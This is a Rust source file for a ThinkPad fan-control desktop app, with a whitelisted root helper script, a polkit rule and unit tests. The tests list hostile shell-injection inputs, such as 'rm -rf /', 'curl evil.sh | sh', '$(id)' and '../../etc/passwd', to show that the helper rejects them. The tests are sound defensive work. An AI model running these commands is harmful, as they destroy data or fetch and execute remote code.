use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs;
use std::process::Command;
use regex::Regex;

const PROC_FAN: &str = "/proc/acpi/ibm/fan";
pub const HELPER_PATH: &str = "/usr/local/bin/thinkutils-fan-control";
pub const POLKIT_RULE_PATH: &str = "/etc/polkit-1/rules.d/50-thinkutils.rules";

/// Dedicated fan control helper script - validates input before writing to fan.
/// Installed at HELPER_PATH by setup_permissions().
pub const HELPER_SCRIPT: &str = r#"#!/bin/bash
set -e
FAN="/proc/acpi/ibm/fan"
# Exact-match whitelist. "watchdog 30" is permitted because the firmware
# watchdog can only ever return the fan to automatic control -- it is the
# recovery path if this app dies while holding a manual level. No other
# watchdog value is accepted, and enable/disable are deliberately absent.
case "$1" in
    "level auto"|"level full-speed"|"level 0"|"level 1"|"level 2"|"level 3"|"level 4"|"level 5"|"level 6"|"level 7"|"watchdog 30")
        echo "$1" > "$FAN"
        ;;
    *)
        echo "Invalid command" >&2
        exit 1
        ;;
esac
"#;

/// Watchdog timeout, in seconds, that the helper is willing to arm.
///
/// Must stay in sync with the literal in HELPER_SCRIPT above; a test asserts it.
pub const FAN_WATCHDOG_SECS: u32 = 30;

/// Polkit rule that only allows the dedicated helper script without password.
/// Much tighter than allowing arbitrary bash execution.
pub const POLKIT_RULE: &str = r#"/* ThinkUtils: Allow passwordless fan control via dedicated helper only */
polkit.addRule(function(action, subject) {
    if (action.id == "org.freedesktop.policykit.exec") {
        var program = action.lookup("program");
        if (program == "/usr/local/bin/thinkutils-fan-control") {
            if (subject.isInGroup("wheel") || subject.isInGroup("sudo")) {
                return polkit.Result.YES;
            }
        }
    }
});
"#;

/// Valid fan speed values (whitelist)
const VALID_SPEEDS: &[&str] = &[
    "auto", "full-speed", "0", "1", "2", "3", "4", "5", "6", "7",
];

/// Whether a fan speed is one this app is willing to send to the hardware.
///
/// This is the Rust-side gate; the installed helper script re-checks the full
/// `level <speed>` string independently, so a bypass here still hits a second
/// whitelist before anything is written.
fn is_valid_speed(speed: &str) -> bool {
    VALID_SPEEDS.contains(&speed)
}

/// Parse the contents of /proc/acpi/ibm/fan.
///
/// Format is `key:\tvalue` lines, e.g.
/// ```text
/// status:         enabled
/// speed:          3084
/// level:          auto
/// ```
/// Unknown keys are ignored — the file carries commands and capability hints
/// (`commands:`, `watchdog:`) that are not fan readings.
fn parse_fan_proc(content: &str) -> HashMap<String, String> {
    let mut fans = HashMap::new();

    for line in content.lines() {
        if let Some((key, value)) = line.split_once(':') {
            let key = key.trim();
            let value = value.trim();

            match key {
                "status" => {
                    fans.insert("status".to_string(), value.to_string());
                }
                "level" => {
                    fans.insert("level".to_string(), value.to_string());
                }
                "speed" => {
                    fans.insert("Fan1".to_string(), format!("{} RPM", value));
                }
                _ => {}
            }
        }
    }

    fans
}

#[derive(Debug, Serialize, Deserialize)]
pub struct SensorData {
    pub temps: HashMap<String, String>,
    pub fans: HashMap<String, String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ApiResponse<T> {
    pub success: bool,
    pub data: Option<T>,
    pub error: Option<String>,
}

/// Create a temp script securely (O_EXCL prevents symlink attacks, random name, restricted perms)
#[cfg(unix)]
pub fn create_secure_temp_script(content: &str) -> Result<String, String> {
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;

    let random = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let path = format!("/tmp/thinkutils_{}.sh", random);

    let mut file = fs::OpenOptions::new()
        .create_new(true) // O_EXCL: fail if exists, don't follow symlinks
        .write(true)
        .mode(0o700) // Only owner can read/write/execute
        .open(&path)
        .map_err(|e| format!("Failed to create temp script: {}", e))?;

    file.write_all(content.as_bytes())
        .map_err(|e| {
            let _ = fs::remove_file(&path);
            format!("Failed to write temp script: {}", e)
        })?;

    Ok(path)
}

#[cfg(not(unix))]
pub fn create_secure_temp_script(content: &str) -> Result<String, String> {
    let random = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let path = format!("/tmp/thinkutils_{}.sh", random);
    fs::write(&path, content)
        .map_err(|e| format!("Failed to create temp script: {}", e))?;
    Ok(path)
}

#[tauri::command]
pub fn get_sensor_data() -> ApiResponse<SensorData> {
    let mut temps = HashMap::new();
    let mut fans = HashMap::new();

    // Get fan info from /proc/acpi/ibm/fan
    match fs::read_to_string(PROC_FAN) {
        Ok(content) => {
            fans.extend(parse_fan_proc(&content));
        }
        Err(e) => {
            return ApiResponse {
                success: false,
                data: None,
                error: Some(format!("Failed to read {}: {}", PROC_FAN, e)),
            };
        }
    }

    // Get temperature data from sensors command
    match Command::new("sensors").arg("thinkpad-isa-0000").output() {
        Ok(output) => {
            if output.status.success() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let temp_re = Regex::new(r"^(.+?):\s+\+?([0-9.]+°C)").unwrap();

                for line in stdout.lines() {
                    if let Some(caps) = temp_re.captures(line) {
                        let label = caps.get(1).unwrap().as_str().trim();
                        let value = caps.get(2).unwrap().as_str();
                        let label_lower = label.to_lowercase();
                        if label_lower.contains("cpu") || label_lower.contains("gpu") {
                            temps.insert(label.to_string(), value.to_string());
                        }
                    }

                    if line.starts_with("fan") && line.contains("RPM") {
                        if let Some((label, rest)) = line.split_once(':') {
                            let label = label.trim();
                            if let Some(rpm_match) = Regex::new(r"(\d+\s*RPM)").unwrap().find(rest) {
                                fans.insert(label.to_string(), rpm_match.as_str().to_string());
                            }
                        }
                    }
                }
            } else {
                temps.insert("Info".to_string(), "Install lm-sensors for temperature data".to_string());
            }
        }
        Err(_) => {
            temps.insert("Info".to_string(), "Install lm-sensors: sudo apt install lm-sensors".to_string());
        }
    }

    ApiResponse {
        success: true,
        data: Some(SensorData { temps, fans }),
        error: None,
    }
}

#[tauri::command]
pub async fn set_fan_speed(speed: String) -> ApiResponse<String> {
    // Validate speed against whitelist
    if !is_valid_speed(&speed) {
        return ApiResponse {
            success: false,
            data: None,
            error: Some(format!("Invalid fan speed: {}", speed)),
        };
    }

    println!("[Fan] Setting speed to: {}", speed);
    let command_str = format!("level {}", speed);

    // 1. Try direct write (no elevation needed)
    if fs::write(PROC_FAN, &command_str).is_ok() {
        println!("[Fan] ✓ Speed set successfully");
        return ApiResponse {
            success: true,
            data: Some(format!("Fan speed set to: {}", speed)),
            error: None,
        };
    }

    println!("[Fan] Need elevated permissions");

    // 2. Use dedicated helper if installed (passwordless via polkit rule)
    if std::path::Path::new(HELPER_PATH).exists() {
        match tokio::process::Command::new("pkexec")
            .arg(HELPER_PATH)
            .arg(&command_str)
            .output()
            .await
        {
            Ok(output) if output.status.success() => {
                println!("[Fan] ✓ Speed set via helper");
                return ApiResponse {
                    success: true,
                    data: Some(format!("Fan speed set to: {}", speed)),
                    error: None,
                };
            }
            Ok(_) => {
                return ApiResponse {
                    success: false,
                    data: None,
                    error: Some("Permission denied. Click 'Grant Permissions' to enable passwordless fan control.".to_string()),
                };
            }
            Err(e) => {
                return ApiResponse {
                    success: false,
                    data: None,
                    error: Some(format!("Failed to execute helper: {}", e)),
                };
            }
        }
    }

    // 3. Fallback: secure temp script + pkexec (will prompt for password)
    let script_content = format!(
        "#!/bin/bash\nset -e\necho '{}' > {}\nexit 0\n",
        command_str, PROC_FAN
    );

    let temp_script = match create_secure_temp_script(&script_content) {
        Ok(path) => path,
        Err(e) => {
            return ApiResponse {
                success: false,
                data: None,
                error: Some(e),
            };
        }
    };

    match tokio::process::Command::new("pkexec")
        .arg("bash")
        .arg(&temp_script)
        .output()
        .await
    {
        Ok(output) => {
            let _ = fs::remove_file(&temp_script);

            if output.status.success() {
                println!("[Fan] ✓ Speed set via pkexec");
                ApiResponse {
                    success: true,
                    data: Some(format!("Fan speed set to: {}", speed)),
                    error: None,
                }
            } else {
                ApiResponse {
                    success: false,
                    data: None,
                    error: Some("Permission denied. Click 'Grant Permissions' to avoid repeated password prompts.".to_string()),
                }
            }
        }
        Err(e) => {
            let _ = fs::remove_file(&temp_script);
            ApiResponse {
                success: false,
                data: None,
                error: Some(format!("Failed to execute pkexec: {}", e)),
            }
        }
    }
}

#[tauri::command]
pub fn check_permissions() -> ApiResponse<bool> {
    // Check if direct write is possible
    let direct_write = fs::OpenOptions::new().write(true).open(PROC_FAN).is_ok();

    // Check if the dedicated helper is installed (installed alongside the polkit rule).
    // We only check the helper because /etc/polkit-1/rules.d/ is root-only,
    // so Path::exists() on the polkit rule always fails for normal users.
    let helper_installed = std::path::Path::new(HELPER_PATH).exists();

    let has_permission = direct_write || helper_installed;

    ApiResponse {
        success: true,
        data: Some(has_permission),
        error: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // -- Speed whitelist --

    #[test]
    fn accepts_every_documented_speed() {
        for s in ["auto", "full-speed", "0", "1", "2", "3", "4", "5", "6", "7"] {
            assert!(is_valid_speed(s), "'{}' should be accepted", s);
        }
    }

    #[test]
    fn rejects_out_of_range_and_malformed_speeds() {
        for s in [
            "8", "-1", "99", "AUTO", "Auto", "full speed", "fullspeed", "",
            " 3", "3 ", "0x3", "level 3",
        ] {
            assert!(!is_valid_speed(s), "'{}' should be rejected", s);
        }
    }

    /// The speed reaches a shell as `level <speed>`, so metacharacters must not survive.
    #[test]
    fn rejects_shell_metacharacters_in_speed() {
        for s in [
            "auto; rm -rf /",
            "3 && curl evil.sh | sh",
            "$(id)",
            "`id`",
            "3\nrm -rf /",
            "3 > /etc/passwd",
        ] {
            assert!(!is_valid_speed(s), "{:?} should be rejected", s);
        }
    }

    // -- /proc/acpi/ibm/fan parsing --

    /// Real output from a ThinkPad running thinkpad_acpi.
    const SAMPLE_PROC_FAN: &str = "\
status:\t\tenabled
speed:\t\t3084
level:\t\tauto
commands:\tlevel <level> (<level> is 0-7, auto, disengaged, full-speed)
commands:\tenable, disable
commands:\twatchdog <timeout> (0 disables, timeout is 0-120)
";

    #[test]
    fn parses_status_speed_and_level() {
        let fans = parse_fan_proc(SAMPLE_PROC_FAN);
        assert_eq!(fans.get("status").map(String::as_str), Some("enabled"));
        assert_eq!(fans.get("level").map(String::as_str), Some("auto"));
        assert_eq!(fans.get("Fan1").map(String::as_str), Some("3084 RPM"));
    }

    /// `commands:` lines describe capabilities, not readings. Treating them as fan
    /// data would surface "level <level> (<level> is 0-7...)" in the UI as a level.
    #[test]
    fn ignores_command_and_capability_lines() {
        let fans = parse_fan_proc(SAMPLE_PROC_FAN);
        assert_eq!(fans.len(), 3, "unexpected keys: {:?}", fans);
        assert!(!fans.contains_key("commands"));
        assert!(!fans.contains_key("watchdog"));
    }

    #[test]
    fn tolerates_empty_and_malformed_input() {
        assert!(parse_fan_proc("").is_empty());
        assert!(parse_fan_proc("no colon here\nanother line").is_empty());
        // A key with no value should not panic and should yield an empty string.
        assert_eq!(parse_fan_proc("level:").get("level").map(String::as_str), Some(""));
    }

    #[test]
    fn parses_numeric_level_not_just_auto() {
        let fans = parse_fan_proc("status:\tenabled\nlevel:\t7\nspeed:\t4500\n");
        assert_eq!(fans.get("level").map(String::as_str), Some("7"));
        assert_eq!(fans.get("Fan1").map(String::as_str), Some("4500 RPM"));
    }

    // -- The installed privileged helper --

    /// Write HELPER_SCRIPT to a temp file and run it, so we test the bash that
    /// actually gets installed at HELPER_PATH and invoked under pkexec.
    fn run_helper(arg: &str) -> std::process::Output {
        use std::os::unix::fs::OpenOptionsExt;
        use std::io::Write;

        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos();
        let path = std::env::temp_dir()
            .join(format!("thinkutils_helper_test_{}_{}.sh", std::process::id(), nanos));

        let mut f = fs::OpenOptions::new()
            .create_new(true)
            .write(true)
            .mode(0o700)
            .open(&path)
            .expect("create helper");
        f.write_all(HELPER_SCRIPT.as_bytes()).expect("write helper");
        drop(f);

        let out = Command::new("bash").arg(&path).arg(arg).output().expect("run helper");
        let _ = fs::remove_file(&path);
        out
    }

    /// This is the security boundary: the helper runs as root under a polkit rule
    /// that grants it passwordless. If its case statement ever accepts something
    /// outside the whitelist, that is arbitrary root.
    #[test]
    fn helper_rejects_everything_outside_the_whitelist() {
        let payloads = [
            "level 8",
            "level -1",
            "enable",
            "disable",
            "level auto; rm -rf /",
            "level auto && curl evil.sh | sh",
            "level $(id)",
            "level `id`",
            "level auto\nrm -rf /",
            "; rm -rf /",
            "../../etc/passwd",
            "level AUTO",
            "",
        ];
        for p in payloads {
            let out = run_helper(p);
            let stderr = String::from_utf8_lossy(&out.stderr);
            assert!(
                stderr.contains("Invalid command"),
                "helper did not reject {:?} (stderr: {:?})",
                p,
                stderr
            );
            assert!(!out.status.success(), "helper exited 0 for {:?}", p);
        }
    }

    /// The watchdog is the recovery path when this app dies holding a manual
    /// level, so exactly one value is permitted -- and only that value.
    #[test]
    fn helper_accepts_only_the_one_watchdog_value() {
        let out = run_helper(&format!("watchdog {}", FAN_WATCHDOG_SECS));
        assert!(
            !String::from_utf8_lossy(&out.stderr).contains("Invalid command"),
            "helper must accept the watchdog arm command"
        );
        for bad in ["watchdog 0", "watchdog 1", "watchdog 120", "watchdog"] {
            let out = run_helper(bad);
            assert!(
                String::from_utf8_lossy(&out.stderr).contains("Invalid command"),
                "helper must reject {:?}",
                bad
            );
        }
    }

    /// HELPER_SCRIPT hardcodes the timeout in a bash case arm, so a change to
    /// the constant alone would silently stop the watchdog from ever arming.
    #[test]
    fn watchdog_constant_matches_helper_script() {
        assert!(
            HELPER_SCRIPT.contains(&format!("watchdog {}", FAN_WATCHDOG_SECS)),
            "FAN_WATCHDOG_SECS ({}) has no matching arm in HELPER_SCRIPT",
            FAN_WATCHDOG_SECS
        );
    }

    /// Complements the above: the whitelist must not be so tight that legitimate
    /// commands are refused. We assert only that they are not *rejected* — the
    /// write itself needs a ThinkPad and root, so it is expected to fail in CI.
    #[test]
    fn helper_accepts_the_documented_commands() {
        for level in ["auto", "full-speed", "0", "1", "2", "3", "4", "5", "6", "7"] {
            let arg = format!("level {}", level);
            let out = run_helper(&arg);
            let stderr = String::from_utf8_lossy(&out.stderr);
            assert!(
                !stderr.contains("Invalid command"),
                "helper wrongly rejected {:?} (stderr: {:?})",
                arg,
                stderr
            );
        }
    }

    /// The polkit rule grants passwordless root. It must name the helper binary and
    /// nothing else -- granting a shell would make the tight helper pointless.
    #[test]
    fn polkit_rule_grants_only_the_helper_binary() {
        assert!(
            POLKIT_RULE.contains(HELPER_PATH),
            "polkit rule must reference the helper path"
        );
        for forbidden in ["/bin/bash", "/bin/sh", "/usr/bin/bash", "/usr/bin/env"] {
            assert!(
                !POLKIT_RULE.contains(forbidden),
                "polkit rule must not grant {}",
                forbidden
            );
        }
    }

    /// The helper is written into a root-owned path by the setup script. If the
    /// constant ever drifted to a user-writable location, any local user could
    /// replace the binary that polkit grants passwordless root to.
    #[test]
    fn helper_path_is_not_user_writable_location() {
        assert!(HELPER_PATH.starts_with("/usr/local/bin/") || HELPER_PATH.starts_with("/usr/bin/"));
        for bad in ["/tmp/", "/var/tmp/", "/home/", "/dev/shm/"] {
            assert!(!HELPER_PATH.starts_with(bad), "helper must not live in {}", bad);
        }
    }
}
